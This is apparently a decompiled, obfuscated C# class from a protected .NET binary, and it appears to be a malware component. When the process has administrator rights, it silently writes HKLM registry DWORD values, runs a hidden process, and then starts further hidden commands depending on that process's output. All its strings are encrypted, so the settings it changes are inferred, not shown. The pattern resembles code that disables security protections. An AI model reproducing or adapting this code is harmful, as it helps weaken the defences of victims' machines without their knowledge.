using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

public static class fztZLVuiiHHP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void sdsmPPiUds()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			BwDFJAVTQyuuQ(getString_0(107374148), getString_0(107374087), getString_0(107395827));
			BwDFJAVTQyuuQ(getString_0(107374062), getString_0(107374001), getString_0(107395844));
			BwDFJAVTQyuuQ(getString_0(107373432), getString_0(107373343), getString_0(107395844));
			BwDFJAVTQyuuQ(getString_0(107373432), getString_0(107373306), getString_0(107395844));
			BwDFJAVTQyuuQ(getString_0(107373432), getString_0(107373269), getString_0(107395844));
			HYXVyVvbVuqhKQBO();
		}
	}

	private static void BwDFJAVTQyuuQ(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void HYXVyVvbVuqhKQBO()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107360513),
			Arguments = getString_0(107373264),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107373227)) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(getString_0(107373661));
			}
			else if (text.StartsWith(getString_0(107373343)) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(getString_0(107373592));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107373523))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107373510)));
			}
			else if (text.StartsWith(getString_0(107372909)) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372880)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372767))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372734)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107373201))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107373088)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372995))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372406)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372317))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372256)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372663))) && text.EndsWith(getString_0(107373702)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372654)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372541))) && !text.EndsWith(getString_0(107395742)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372500)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372455))) && !text.EndsWith(getString_0(107395827)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371914)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371853))) && !text.EndsWith(getString_0(107371776)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371771)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371678))) && !text.EndsWith(getString_0(107371776)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372173)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372052))) && !text.EndsWith(getString_0(107371776)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107372039)));
			}
			else if (text.StartsWith(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371930))) && !text.EndsWith(getString_0(107371776)))
			{
				IXwrYHiCiHkqajBl(PHGJAOmKtxaSj.OidcwcAbYGGzBZS(getString_0(107371401)));
			}
		}
	}

	public static void IXwrYHiCiHkqajBl(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107360513),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static fztZLVuiiHHP()
	{
		Strings.CreateGetStringDelegate(typeof(fztZLVuiiHHP));
	}
}
